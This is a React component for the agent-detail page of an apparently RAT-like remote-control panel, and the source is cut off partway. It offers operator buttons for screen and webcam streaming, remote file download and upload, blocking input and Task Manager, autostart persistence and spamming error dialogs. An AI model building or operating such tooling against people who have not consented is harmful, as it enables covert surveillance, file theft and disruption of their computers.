import React, { useState, useEffect } from 'react';
import {
  Box,
  Typography,
  Button,
  IconButton,
  TextField,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Grid,
  Alert,
  Select,
  MenuItem,
  FormControl,
  InputLabel,
  Snackbar
} from '@mui/material';
import {
  ArrowBack as ArrowBackIcon,
  Screenshot as ScreenshotIcon,
  Folder as FolderIcon,
  Download as DownloadIcon,
  Upload as UploadIcon,
  Image as ImageIcon,
  Block as BlockIcon,
  ScreenRotation as ScreenRotationIcon,
  VolumeOff as VolumeOffIcon,
  Visibility as VisibilityIcon,
  Lock as LockIcon,
  PowerSettingsNew as PowerSettingsNewIcon,
  Sensors as SensorsIcon,
  Cancel as CancelIcon,
  InsertDriveFile as FileIcon,
  ArrowUpward as ArrowUpwardIcon,
  Storage as StorageIcon,
  Computer as ComputerIcon,
  Videocam as VideocamIcon,
  Mic as MicIcon,
  MicOff as MicOffIcon,
  History as HistoryIcon,
  DeleteForever as DeleteForeverIcon,
  Error as ErrorIcon,
  PlayArrow as PlayArrowIcon,
  Stop as StopIcon,
  CheckCircle as CheckCircleIcon,
  Delete as DeleteIcon,
  Tab as TabIcon,
  Wallpaper as WallpaperIcon,
  FolderOpen as FolderOpenIcon,
  CameraAlt as CameraAltIcon
} from '@mui/icons-material';
import { useParams, useNavigate } from 'react-router-dom';
import { formatDistanceToNow } from 'date-fns';
import api from '../services/api';
import socket from '../services/socket';
import BackgroundFx from './BackgroundFx';

export default function AgentDetail() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [agent, setAgent] = useState(null);
  const [commandResult, setCommandResult] = useState('');
  const [error, setError] = useState('');

  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(''), 5000);
      return () => clearTimeout(timer);
    }
  }, [error]);
  const [screenshotData, setScreenshotData] = useState(null);

  // Modal states
  const [paramModal, setParamModal] = useState({ open: false, title: '', label: '', placeholder: '', command: null });
  const [uploadModal, setUploadModal] = useState(false);
  const [rotateModal, setRotateModal] = useState(false);
  const [fullscreenModal, setFullscreenModal] = useState(false);
  const [blockAppModal, setBlockAppModal] = useState(false);
  const [fileBrowserModal, setFileBrowserModal] = useState(false);
  const [errorSpamModal, setErrorSpamModal] = useState(false);

  // Input states
  const [paramValue, setParamValue] = useState('');
  const [uploadFile, setUploadFile] = useState(null);
  const [uploadPath, setUploadPath] = useState('');
  const [uploadBrowsing, setUploadBrowsing] = useState(false);
  const [rotateAngle, setRotateAngle] = useState('90');
  const [fullscreenFile, setFullscreenFile] = useState(null);
  const [fullscreenUrl, setFullscreenUrl] = useState('');
  const [fullscreenDuration, setFullscreenDuration] = useState('30');
  const [runningApps, setRunningApps] = useState([]);
  const [selectedApp, setSelectedApp] = useState('');
  const [currentPath, setCurrentPath] = useState('C:\\');
  const [fileItems, setFileItems] = useState([]);
  const [loadingFiles, setLoadingFiles] = useState(false);
  const [drives, setDrives] = useState([]);
  const [showDrives, setShowDrives] = useState(false);
  const [streamModal, setStreamModal] = useState(false);
  const [streaming, setStreaming] = useState(false);
  const [streamFrame, setStreamFrame] = useState(null);
  const [monitors, setMonitors] = useState([]);
  const [selectedMonitor, setSelectedMonitor] = useState(null);

  // Error spam states
  const [errorCount, setErrorCount] = useState('10');
  const [errorDelay, setErrorDelay] = useState('0.5');
  const [errorType, setErrorType] = useState('critical');
  const [customErrorTitle, setCustomErrorTitle] = useState('');
  const [customErrorMessage, setCustomErrorMessage] = useState('');
  const [useCustomError, setUseCustomError] = useState(false);

  // Browser tabs states
  const [openTabsModal, setOpenTabsModal] = useState(false);
  const [tabUrl, setTabUrl] = useState('');
  const [tabCount, setTabCount] = useState('1');
  const [tabDelay, setTabDelay] = useState('1');

  // Wallpaper states
  const [wallpaperModal, setWallpaperModal] = useState(false);
  const [wallpaperFile, setWallpaperFile] = useState(null);

  // Open file states
  const [openFileModal, setOpenFileModal] = useState(false);
  const [openFilePath, setOpenFilePath] = useState('');
  const [openFileBrowserMode, setOpenFileBrowserMode] = useState(false); // true = open file, false = download

  // Toggle states for buttons
  const [audioMuted, setAudioMuted] = useState(false);
  const [taskbarHidden, setTaskbarHidden] = useState(false);
  const [taskManagerBlocked, setTaskManagerBlocked] = useState(false);

  // Logs modal
  const [logsModal, setLogsModal] = useState(false);
  const [agentLogs, setAgentLogs] = useState([]);
  const [currentUser, setCurrentUser] = useState(null);

  useEffect(() => {
    console.log('[AgentDetail] Component mounted, agent ID:', id);
    loadAgent();
    loadCurrentUser();

    const handleResult = (data) => {
      if (data.agent_id === parseInt(id)) {
        try {
          const parsed = JSON.parse(data.result);

          // Игнорируем stream_frame — они обрабатываются в StreamWindow
          if (parsed.stream_frame) {
            return;
          }

          // Игнорируем audio_chunk — они обрабатываются в StreamWindow
          if (parsed.audio_chunk) {
            return;
          }

          console.log('[AgentDetail] Received command result:', data);
          console.log('[AgentDetail] Parsed result:', parsed);

          // Обработка screenshot
          if (parsed.image) {
            console.log('[AgentDetail] Setting screenshot data, length:', parsed.image.length);
            setScreenshotData(parsed.image);
            setCommandResult('Screenshot captured successfully!');
          }
          // Обработка списка приложений
          else if (parsed.apps) {
            console.log('[AgentDetail] Received apps list:', parsed.apps);
            setRunningApps(parsed.apps);
          }
          // Обработка списка дисков
          else if (parsed.drives) {
            console.log('[AgentDetail] Received drives list:', parsed.drives);
            setDrives(parsed.drives);
            setShowDrives(true);
          }
          // Обработка списка мониторов
          else if (parsed.monitors) {
            console.log('[AgentDetail] Received monitors list:', parsed.monitors);
            setMonitors(parsed.monitors);
            // Модалка не нужна - используем отдельное окно
          }
          // Обработка файлового браузера
          else if (parsed.current_path !== undefined) {
            console.log('[AgentDetail] Received directory listing:', parsed);
            setCurrentPath(parsed.current_path);
            setFileItems(parsed.items || []);
            setLoadingFiles(false);
            setShowDrives(false);
          }
          // Обработка download
          else if (parsed.data && parsed.filename) {
            setCommandResult(`File downloaded: ${parsed.filename}`);

            // Создаем ссылку для скачивания
            const link = document.createElement('a');
            link.href = `data:application/octet-stream;base64,${parsed.data}`;
            link.download = parsed.filename;
            link.click();
          }
          // Обычный JSON результат
          else {
            setCommandResult(JSON.stringify(parsed, null, 2));
          }
        } catch (e) {
          console.log('[AgentDetail] Failed to parse JSON:', e);
          // Пробуем убрать внешние кавычки если это JSON-строка
          let result = data.result;
          if (typeof result === 'string' && result.startsWith('"') && result.endsWith('"')) {
            try {
              result = JSON.parse(result);
            } catch {}
          }
          setCommandResult(result);
        }
      }
    };

    const handleOffline = (data) => {
      if (data.id === parseInt(id)) {
        console.log('[AgentDetail] Agent went offline:', data);
        setAgent((prev) => ({ ...prev, status: 'offline' }));
      }
    };

    const handleAgentUpdated = (data) => {
      if (data.id === parseInt(id)) {
        console.log('[AgentDetail] Agent updated:', data);
        setAgent((prev) => ({
          ...prev,
          status: data.status,
          last_seen: data.last_seen
        }));
      }
    };

    console.log('[AgentDetail] Registering socket listeners');
    socket.on('command_result', handleResult);
    socket.on('agent_offline', handleOffline);
    socket.on('agent_updated', handleAgentUpdated);

    // Update timestamps every minute
    const interval = setInterval(() => {
      loadAgent();
    }, 60000);

    return () => {
      console.log('[AgentDetail] Component unmounting, removing listeners');
      socket.off('command_result', handleResult);
      socket.off('agent_offline', handleOffline);
      socket.off('agent_updated', handleAgentUpdated);
      clearInterval(interval);
    };
  }, [id]);

  const loadAgent = async () => {
    try {
      const response = await api.get('/api/agents');
      const foundAgent = response.data.find((a) => a.id === parseInt(id));
      if (foundAgent) {
        setAgent(foundAgent);
      } else {
        setError('Agent not found');
      }
    } catch (err) {
      setError('Failed to load agent');
    }
  };

  const loadCurrentUser = async () => {
    try {
      const response = await api.get('/api/users');
      const token = localStorage.getItem('token');
      if (token) {
        const payload = JSON.parse(atob(token.split('.')[1]));
        const userId = payload.sub;
        const user = response.data.find(u => u.id === parseInt(userId));
        setCurrentUser(user);
      }
    } catch (err) {
      console.error('Failed to load current user:', err);
    }
  };

  const loadAgentLogs = async () => {
    try {
      const response = await api.get(`/api/agents/${id}/logs?limit=100`);
      setAgentLogs(response.data);
      setLogsModal(true);
    } catch (err) {
      setError('Failed to load logs');
    }
  };

  const clearAgentLogs = async () => {
    if (!window.confirm('Are you sure you want to clear all logs for this agent?')) {
      return;
    }
    try {
      await api.delete(`/api/agents/${id}/logs`);
      setAgentLogs([]);
      setError('');
      alert('Agent logs cleared successfully');
    } catch (err) {
      setError('Failed to clear logs');
    }
  };

  const sendCommand = async (command) => {
    try {
      setError('');
      setCommandResult('Executing...');
      await api.post(`/api/agents/${id}/command`, { command });
    } catch (err) {
      setError(err.response?.data?.error || 'Command failed');
      setCommandResult('');
    }
  };

  const quickCommand = (command) => {
    sendCommand(command);
  };

  const toggleAudio = () => {
    if (audioMuted) {
      sendCommand('unmute_audio');
      setAudioMuted(false);
    } else {
      sendCommand('mute_audio');
      setAudioMuted(true);
    }
  };

  const toggleTaskbar = () => {
    if (taskbarHidden) {
      sendCommand('show_taskbar');
      setTaskbarHidden(false);
    } else {
      sendCommand('hide_taskbar');
      setTaskbarHidden(true);
    }
  };

  const toggleTaskManager = () => {
    if (taskManagerBlocked) {
      sendCommand('stop_taskmgr_monitor');
      setTaskManagerBlocked(false);
    } else {
      sendCommand('start_taskmgr_monitor');
      setTaskManagerBlocked(true);
    }
  };

  const handleOpenTabs = () => {
    if (!tabUrl || !tabCount || !tabDelay) {
      setError('Please fill all fields');
      return;
    }

    const count = parseInt(tabCount);
    const delay = parseFloat(tabDelay);

    if (count < 1 || count > 100) {
      setError('Tab count must be between 1 and 100');
      return;
    }

    if (delay < 0 || delay > 60) {
      setError('Delay must be between 0 and 60 seconds');
      return;
    }

    sendCommand(`open_tabs ${tabUrl} ${count} ${delay}`);
    setOpenTabsModal(false);
    setTabUrl('');
    setTabCount('1');
    setTabDelay('1');
    setCommandResult(`Opening ${count} tabs with ${delay}s delay...`);
  };

  const handleChangeWallpaper = async () => {
    if (!wallpaperFile) {
      setError('Please select an image file');
      return;
    }

    try {
      const reader = new FileReader();
      reader.onload = async (e) => {
        const base64Data = e.target.result.split(',')[1];

        await api.post(`/api/agents/${id}/command`, {
          command: 'change_wallpaper',
          file_data: base64Data,
          filename: wallpaperFile.name
        });

        setWallpaperModal(false);
        setWallpaperFile(null);
        setCommandResult('Changing wallpaper...');
      };
      reader.readAsDataURL(wallpaperFile);
    } catch (error) {
      setError('Failed to change wallpaper');
    }
  };

  const handleOpenFile = () => {
    if (!openFilePath) {
      setError('Please enter a file path');
      return;
    }

    sendCommand(`open_file ${openFilePath}`);
    setOpenFileModal(false);
    setOpenFilePath('');
    setCommandResult(`Opening file: ${openFilePath}...`);
  };

  const openBlockAppModal = async () => {
    setBlockAppModal(true);
    setRunningApps([]);
    setSelectedApp('');
    // Запрашиваем список приложений
    await sendCommand('get_running_apps');
  };

  const handleBlockApp = () => {
    if (selectedApp) {
      sendCommand(`block_app ${selectedApp}`);
      setBlockAppModal(false);
      setSelectedApp('');
      setCommandResult(`Blocking ${selectedApp}...`);
    }
  };

  const openFileBrowser = async () => {
    setOpenFileBrowserMode(false); // Download mode
    setFileBrowserModal(true);
    setLoadingFiles(false);
    setShowDrives(false);
    setDrives([]);
    setFileItems([]);
    // Запрашиваем список дисков
    await sendCommand('get_drives');
  };

  const openFileBrowserForOpen = async () => {
    setOpenFileBrowserMode(true); // Open file mode
    setFileBrowserModal(true);
    setLoadingFiles(false);
    setShowDrives(false);
    setDrives([]);
    setFileItems([]);
    // Запрашиваем список дисков
    await sendCommand('get_drives');
  };

  const selectDrive = async (drivePath) => {
    setLoadingFiles(true);
    setFileItems([]);
    await sendCommand(`browse_directory "${drivePath}"`);
  };

  const browseDirectory = async (path) => {
    setLoadingFiles(true);
    setFileItems([]);
    await sendCommand(`browse_directory "${path}"`);
  };

  const handleFileClick = (item) => {
    if (item.is_dir) {
      browseDirectory(item.path);
    } else {
      if (openFileBrowserMode) {
        // Открываем файл
        sendCommand(`open_file ${item.path}`);
        setFileBrowserModal(false);
        setCommandResult(`Opening ${item.name}...`);
      } else {
        // Скачиваем файл
        sendCommand(`download "${item.path}"`);
        setFileBrowserModal(false);
        setCommandResult(`Downloading ${item.name}...`);
      }
    }
  };

  const handleUploadFolderClick = (item) => {
    if (item.is_dir) {
      browseDirectory(item.path);
    }
  };

  const selectUploadFolder = () => {
    setUploadPath(currentPath);
    setUploadBrowsing(false);
  };

  const goUpDirectory = () => {
    const parts = currentPath.split('\\').filter(p => p);
    if (parts.length > 1) {
      const parentPath = parts.slice(0, -1).join('\\') + '\\';
      browseDirectory(parentPath);
    } else if (parts.length === 1) {
      // Возвращаемся к выбору дисков
      setShowDrives(true);
      setFileItems([]);
      sendCommand('get_drives');
    }
  };

  const goToDrives = () => {
    setShowDrives(true);
    setFileItems([]);
    setLoadingFiles(false);
    sendCommand('get_drives');
  };

  const openStreamWindow = () => {
    const width = 1200;
    const height = 800;
    const left = (window.screen.width - width) / 2;
    const top = (window.screen.height - height) / 2;

    window.open(
      `/stream?agentId=${id}`,
      'StreamWindow',
      `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=no,status=no,menubar=no,toolbar=no,location=no`
    );
  };

  const openWebcamStreamWindow = () => {
    const width = 1200;
    const height = 800;
    const left = (window.screen.width - width) / 2;
    const top = (window.screen.height - height) / 2;

    window.open(
      `/webcam-stream?agentId=${id}`,
      'WebcamStreamWindow',
      `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=no,status=no,menubar=no,toolbar=no,location=no`
    );
  };

  const startScreenStream = async () => {
    // Сначала получаем список мониторов
    setMonitors([]);
    setSelectedMonitor(null);
    await sendCommand('get_monitors');
    // Модалка откроется автоматически после получения списка мониторов
  };

  const startStreamWithMonitor = (monitorIndex) => {
    setStreaming(true);
    setStreamFrame(null);

    // Используем params вместо строкового формата
    api.post(`/api/agents/${id}/command`, {
      command: 'start_screen_stream',
      params: {
        interval: 0.2,
        monitor_index: monitorIndex !== null ? monitorIndex : 0
      }
    }).catch(err => {
      setError(err.response?.data?.error || 'Command failed');
    });

    setSelectedMonitor(monitorIndex);
  };

  const stopScreenStream = () => {
    setStreaming(false);
    sendCommand('stop_screen_stream');
  };

  const openParamModal = (title, label, placeholder, commandBuilder) => {
    setParamModal({ open: true, title, label, placeholder, command: commandBuilder });
    setParamValue('');
  };

  const handleParamSubmit = () => {
    if (paramValue && paramModal.command) {
      sendCommand(paramModal.command(paramValue));
      setParamModal({ open: false, title: '', label: '', placeholder: '', command: null });
      setParamValue('');
    }
  };

  const handleUploadSubmit = async () => {
    if (!uploadFile || !uploadPath) {
      setError('Please select a file and enter destination path');
      return;
    }

    const formData = new FormData();
    formData.append('file', uploadFile);
    formData.append('path', uploadPath);

    try {
      setError('');
      setCommandResult('Uploading...');
      await api.post(`/api/agents/${id}/upload`, formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
      });
      setUploadModal(false);
      setUploadFile(null);
      setUploadPath('');
      setCommandResult('File uploaded successfully');
    } catch (err) {
      setError(err.response?.data?.error || 'Upload failed');
      setCommandResult('');
    }
  };

  const handleRotateSubmit = () => {
    sendCommand(`rotate_display ${rotateAngle}`);
    setRotateModal(false);
  };

  const handleFullscreenSubmit = async () => {
    if (fullscreenFile) {
      // Загружаем файл на сервер и получаем URL
      const formData = new FormData();
      formData.append('file', fullscreenFile);

      try {
        setError('');
        console.log('[AgentDetail] Uploading file to /api/upload-temp');
        const response = await api.post('/api/upload-temp', formData, {
          headers: { 'Content-Type': 'multipart/form-data' }
        });
        console.log('[AgentDetail] Upload response:', response.data);
        const imageUrl = response.data.url;
        console.log('[AgentDetail] Image URL length:', imageUrl.length);
        console.log('[AgentDetail] Sending fullscreen_image command');
        sendCommand(`fullscreen_image ${imageUrl} ${fullscreenDuration}`);
        setFullscreenModal(false);
        setFullscreenFile(null);
        setFullscreenUrl('');
      } catch (err) {
        console.error('[AgentDetail] Upload error:', err);
        setError('Failed to upload image');
      }
    } else if (fullscreenUrl) {
      sendCommand(`fullscreen_image ${fullscreenUrl} ${fullscreenDuration}`);
      setFullscreenModal(false);
      setFullscreenFile(null);
      setFullscreenUrl('');
    } else {
      setError('Please provide an image URL or upload a file');
    }
  };

  const handleErrorSpam = () => {
    if (useCustomError) {
      if (!customErrorTitle || !customErrorMessage) {
        setError('Please provide both title and message for custom error');
        return;
      }
      sendCommand(`spam_errors_custom ${errorCount} "${customErrorTitle}" "${customErrorMessage}" ${errorDelay}`);
    } else {
      sendCommand(`spam_errors ${errorCount} ${errorDelay} ${errorType}`);
    }
    setErrorSpamModal(false);
    setCustomErrorTitle('');
    setCustomErrorMessage('');
    setUseCustomError(false);
  };

  const downloadScreenshot = () => {
    if (screenshotData) {
      const link = document.createElement('a');
      link.href = `data:image/png;base64,${screenshotData}`;
      link.download = `screenshot_${Date.now()}.png`;
      link.click();
    }
  };

  if (!agent) {
    return (
      <Box className="dashboard-shell">
        <BackgroundFx />
        <Box className="dashboard-page">
          <Typography color="error">{error || 'Loading...'}</Typography>
        </Box>
      </Box>
    );
  }

  const commandGroups = [
    {
      title: 'Monitoring',
      buttons: [
        {
          label: 'Screenshot',
          icon: <ScreenshotIcon />,
          action: () => quickCommand('screenshot'),
          color: 'primary'
        },
        {
          label: 'Screen Stream',
          icon: <VideocamIcon />,
          action: openStreamWindow,
          color: 'primary'
        },
        {
          label: 'Webcam Stream',
          icon: <CameraAltIcon />,
          action: openWebcamStreamWindow,
          color: 'primary'
        }
      ]
    },
    {
      title: 'File Management',
      buttons: [
        {
          label: 'Download File',
          icon: <DownloadIcon />,
          action: openFileBrowser,
          color: 'primary'
        },
        {
          label: 'Upload File',
          icon: <UploadIcon />,
          action: () => setUploadModal(true),
          color: 'primary'
        },
        {
          label: 'Open File',
          icon: <FolderOpenIcon />,
          action: openFileBrowserForOpen,
          color: 'primary'
        }
      ]
    },
    {
      title: 'Display & UI',
      buttons: [
        {
          label: 'Open Browser Tabs',
          icon: <TabIcon />,
          action: () => setOpenTabsModal(true),
          color: 'primary'
        },
        {
          label: 'Change Wallpaper',
          icon: <WallpaperIcon />,
          action: () => setWallpaperModal(true),
          color: 'primary'
        },
        {
          label: 'Fullscreen Image',
          icon: <ImageIcon />,
          action: () => setFullscreenModal(true),
          color: 'primary'
        },
        {
          label: 'Rotate Display',
          icon: <ScreenRotationIcon />,
          action: () => setRotateModal(true),
          color: 'warning'
        }
      ]
    },
    {
      title: 'System Control',
      buttons: [
        {
          label: 'Block Input',
          icon: <BlockIcon />,
          action: () => openParamModal('Block Input', 'Duration (seconds)', '10', (duration) => `block_input ${duration}`),
          color: 'warning'
        },
        {
          label: audioMuted ? 'Unmute Audio' : 'Mute Audio',
          icon: <VolumeOffIcon />,
          action: toggleAudio,
          color: 'warning',
          active: audioMuted
        },
        {
          label: taskbarHidden ? 'Show Taskbar' : 'Hide Taskbar',
          icon: <VisibilityIcon />,
          action: toggleTaskbar,
          color: 'warning',
          active: taskbarHidden
        },
        {
          label: taskManagerBlocked ? 'Enable Task Manager' : 'Block Task Manager',
          icon: <BlockIcon />,
          action: toggleTaskManager,
          color: 'warning',
          active: taskManagerBlocked
        },
        {
          label: 'Block Application',
          icon: <CancelIcon />,
          action: openBlockAppModal,
          color: 'warning'
        },
        {
          label: 'Spam Errors',
          icon: <ErrorIcon />,
          action: () => setErrorSpamModal(true),
          color: 'warning'
        }
      ]
    },
    {
      title: 'Autostart',
      buttons: [
        {
          label: 'Check Autostart',
          icon: <CheckCircleIcon />,
          action: () => quickCommand('check_autostart'),
          color: 'primary'
        },
        {
          label: 'Enable Autostart',
          icon: <PlayArrowIcon />,
          action: () => quickCommand('enable_autostart'),
          color: 'primary'
        },
        {
          label: 'Disable Autostart',
          icon: <StopIcon />,
          action: () => quickCommand('disable_autostart'),
          color: 'warning'
        }
      ]
    },
    {
      title: 'Critical Actions',
      buttons: [
        {
          label: 'Lock Screen',
          icon: <LockIcon />,
          action: () => quickCommand('lock_screen'),
          color: 'danger'
        },
        {
          label: 'Shutdown',
          icon: <PowerSettingsNewIcon />,
          action: () => quickCommand('shutdown'),
          color: 'danger'
        },
        {
          label: 'Uninstall Agent',
          icon: <DeleteIcon />,
          action: () => {
            if (window.confirm('Are you sure you want to uninstall the agent? This action cannot be undone.')) {
              quickCommand('uninstall_agent');
            }
          },
          color: 'danger'
        }
      ]
    }
  ];

  return (
    <Box className="dashboard-shell">
      <BackgroundFx />
      <Box className="dashboard-noise" />
      <Box className="dashboard-orbit dashboard-orbit-left" />
      <Box className="dashboard-orbit dashboard-orbit-right" />

      <Box className="dashboard-page">
        <Box className="dashboard-panel dashboard-header reveal reveal-1">
          <Box>
            <Button
              startIcon={<ArrowBackIcon />}
              onClick={() => navigate('/')}
              sx={{
                color: 'var(--text-secondary)',
                mb: 2,
                '&:hover': { color: 'var(--accent)' }
              }}
            >
              Back to agents
            </Button>
            <Typography className="eyebrow">
              agent control / node #{String(agent.id).padStart(3, '0')}
            </Typography>
            <Box className="dashboard-title-row">
              <Box className="dashboard-logo">
                <SensorsIcon fontSize="small" />
              </Box>
              <Box>
                <Typography variant="h3" className="dashboard-title">
                  {agent.hostname}
                </Typography>
                <Typography className="dashboard-subtitle">
                  {agent.ip} • {agent.os || 'Unknown OS'} • {agent.username || 'Unknown User'}
                </Typography>
              </Box>
            </Box>
          </Box>

          <Box className="dashboard-header-meta">
            <Box className={`status-badge ${agent.status === 'online' ? 'is-online' : 'is-offline'}`}>
              <span className="status-badge-dot" />
              {agent.status}
            </Box>
            <Typography className="dashboard-timestamp">
              Last seen: {agent.last_seen
                ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true })
                : 'Never'}
            </Typography>
          </Box>
        </Box>

        <Snackbar
          open={!!error}
          autoHideDuration={5000}
          onClose={() => setError('')}
          anchorOrigin={{ vertical: 'top', horizontal: 'center' }}
        >
          <Alert severity="error" onClose={() => setError('')} sx={{ width: '100%' }}>
            {error}
          </Alert>
        </Snackbar>

        <Box sx={{ mb: 4, mt: 3 }}>
          {commandGroups.map((group, groupIndex) => (
            <Box key={groupIndex} className="reveal reveal-3 category-block">
              <Box className="section-head">
                <Typography className="category-title">
                  {group.title}
                </Typography>
              </Box>
              <Grid container spacing={2} className="btn-grid">
                {group.buttons.map((btn, btnIndex) => (
                  <Grid item xs={12} sm={6} md={4} lg={3} key={btnIndex}>
                    <Button
                      fullWidth
                      variant="outlined"
                      startIcon={btn.icon}
                      onClick={btn.action}
                      disabled={agent.status !== 'online'}
                      className={`action-btn ${btn.color === 'warning' ? 'warning' : btn.color === 'danger' ? 'danger' : 'primary'}`}
                    >
                      {btn.label}
                    </Button>
                  </Grid>
                ))}
              </Grid>
            </Box>
          ))}
        </Box>

        <Box className="section-head reveal reveal-4">
          <Typography className="section-title">Command Output</Typography>
        </Box>

        <Box className="dashboard-panel reveal reveal-5" sx={{ p: 3 }}>
          {commandResult ? (
            <Box className="result-box">
              {commandResult}
            </Box>
          ) : (
            <Typography color="text.secondary" sx={{ textAlign: 'center', py: 4 }}>
              No command output yet. Execute a command to see results here.
            </Typography>
          )}
        </Box>

        {screenshotData && (
          <>
            {console.log('[AgentDetail] Rendering screenshot, data length:', screenshotData.length)}
            <Box className="section-head reveal reveal-6" sx={{ mt: 4 }}>
              <Typography className="section-title">Screenshot</Typography>
              <Button
                variant="contained"
                startIcon={<DownloadIcon />}
                onClick={downloadScreenshot}
                className="action-btn"
              >
                Download
              </Button>
            </Box>

            <Box className="dashboard-panel reveal reveal-7" sx={{ p: 3 }}>
              <img
                src={`data:image/png;base64,${screenshotData}`}
                alt="Screenshot"
                style={{
                  width: '100%',
                  height: 'auto',
                  borderRadius: '8px',
                  border: '1px solid var(--border)'
                }}
              />
            </Box>
          </>
        )}
      </Box>

      {/* Parameter Modal */}
      <Dialog
        open={paramModal.open}
        onClose={() => setParamModal({ open: false, title: '', label: '', placeholder: '', command: null })}
        PaperProps={{ className: 'modal-content' }}
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">{paramModal.title}</Typography>
        </DialogTitle>
        <DialogContent>
          <TextField
            fullWidth
            label={paramModal.label}
            placeholder={paramModal.placeholder}
            value={paramValue}
            onChange={(e) => setParamValue(e.target.value)}
            className="input-field"
            sx={{ mt: 2 }}
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setParamModal({ open: false, title: '', label: '', placeholder: '', command: null })}>
            Cancel
          </Button>
          <Button onClick={handleParamSubmit} variant="contained" className="action-btn">
            Execute
          </Button>
        </DialogActions>
      </Dialog>

      {/* Upload Modal */}
      <Dialog
        open={uploadModal}
        onClose={() => {
          setUploadModal(false);
          setUploadBrowsing(false);
        }}
        PaperProps={{ className: 'modal-content' }}
        maxWidth="md"
        fullWidth
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">Upload File</Typography>
        </DialogTitle>
        <DialogContent>
          <input
            type="file"
            onChange={(e) => setUploadFile(e.target.files[0])}
            style={{ marginTop: 16, marginBottom: 16 }}
          />

          {!uploadBrowsing ? (
            <Box sx={{ display: 'flex', gap: 1, alignItems: 'center' }}>
              <TextField
                fullWidth
                label="Destination path"
                placeholder="C:\Users\file.txt"
                value={uploadPath}
                onChange={(e) => setUploadPath(e.target.value)}
                className="input-field"
              />
              <Button
                variant="outlined"
                onClick={() => {
                  setUploadBrowsing(true);
                  setLoadingFiles(false);
                  setShowDrives(false);
                  setDrives([]);
                  setFileItems([]);
                  sendCommand('get_drives');
                }}
                sx={{
                  borderColor: 'rgba(49, 211, 139, 0.5)',
                  color: '#31d38b',
                  '&:hover': {
                    borderColor: '#31d38b',
                    bgcolor: 'rgba(49, 211, 139, 0.1)'
                  }
                }}
              >
                Browse
              </Button>
            </Box>
          ) : (
            <Box sx={{ mt: 2 }}>
              {/* Navigation Bar */}
              <Box className="nav-bar" sx={{ mb: 2, display: 'flex', alignItems: 'center', gap: 1, p: 1 }}>
                <Button
                  startIcon={<ArrowUpwardIcon />}
                  onClick={goUpDirectory}
                  disabled={showDrives || loadingFiles}
                  size="small"
                  variant="outlined"
                  sx={{
                    borderColor: 'rgba(49, 211, 139, 0.2)',
                    color: 'var(--accent)',
                    '&:hover': {
                      borderColor: 'var(--accent)',
                      backgroundColor: 'rgba(49, 211, 139, 0.08)'
                    }
                  }}
                >
                  Up
                </Button>
                <Button
                  startIcon={<ComputerIcon />}
                  onClick={goToDrives}
                  disabled={showDrives || loadingFiles}
                  size="small"
                  variant="outlined"
                  sx={{
                    borderColor: 'rgba(49, 211, 139, 0.2)',
                    color: 'var(--accent)',
                    '&:hover': {
                      borderColor: 'var(--accent)',
                      backgroundColor: 'rgba(49, 211, 139, 0.08)'
                    }
                  }}
                >
                  This PC
                </Button>
                <Box className="address-bar" sx={{ flex: 1, px: 2, py: 0.5 }}>
                  <Typography variant="body2" color="text.primary">
                    {showDrives ? 'This PC' : currentPath}
                  </Typography>
                </Box>
                <Button
                  variant="contained"
                  onClick={selectUploadFolder}
                  disabled={showDrives}
                  sx={{
                    bgcolor: '#31d38b',
                    color: '#060707',
                    '&:hover': {
                      bgcolor: '#28b575'
                    }
                  }}
                >
                  Select This Folder
                </Button>
              </Box>

              {/* Content Area */}
              {loadingFiles ? (
                <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: 300 }}>
                  <Typography variant="body2" color="text.secondary">
                    Loading...
                  </Typography>
                </Box>
              ) : showDrives ? (
                <Grid container spacing={2}>
                  {drives.map((drive, index) => (
                    <Grid item xs={12} sm={6} key={index}>
                      <Box
                        onClick={() => selectDrive(drive.path)}
                        className="drive-card"
                        sx={{ p: 2, cursor: 'pointer' }}
                      >
                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 2 }}>
                          <StorageIcon sx={{ fontSize: 40, color: 'var(--accent)' }} />
                          <Box>
                            <Typography variant="body1" fontWeight="bold" color="text.primary">
                              Local Disk ({drive.letter}:)
                            </Typography>
                            {drive.total > 0 && (
                              <Typography variant="caption" color="text.secondary">
                                {(drive.free / (1024 ** 3)).toFixed(1)} GB free
                              </Typography>
                            )}
                          </Box>
                        </Box>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              ) : (
                <Box sx={{
                  maxHeight: 300,
                  overflowY: 'auto',
                  border: '1px solid rgba(0, 212, 255, 0.2)',
                  borderRadius: 1,
                  backgroundColor: 'rgba(0, 0, 0, 0.3)'
                }}>
                  {fileItems.filter(item => item.is_dir).map((item, index) => (
                    <Box
                      key={index}
                      onClick={() => handleUploadFolderClick(item)}
                      className="file-browser-item"
                      sx={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: 2,
                        p: 1.5,
                        cursor: 'pointer',
                        margin: '4px',
                        borderRadius: '8px'
                      }}
                    >
                      <FolderIcon sx={{ fontSize: 32, color: '#ffa726' }} />
                      <Typography variant="body2" color="text.primary">
                        {item.name}
                      </Typography>
                    </Box>
                  ))}
                </Box>
              )}
            </Box>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => {
            setUploadModal(false);
            setUploadBrowsing(false);
          }}>Cancel</Button>
          <Button onClick={handleUploadSubmit} variant="contained" className="action-btn" disabled={!uploadFile || !uploadPath}>
            Upload
          </Button>
        </DialogActions>
      </Dialog>

      {/* Rotate Display Modal */}
      <Dialog
        open={rotateModal}
        onClose={() => setRotateModal(false)}
        PaperProps={{ className: 'modal-content' }}
      >
        <DialogTitle className="modal-header">
          <Typography variant="h5" className="glow-text">Rotate Display</Typography>
        </DialogTitle>
        <DialogContent>
          <Box sx={{ display: 'flex', gap: 2, mt: 2 }}>
            {['0', '90', '180', '270'].map((angle) => (
              <Button
                key={angle}
                variant={rotateAngle === angle ? 'contained' : 'outlined'}
                onClick={() => setRotateAngle(angle)}
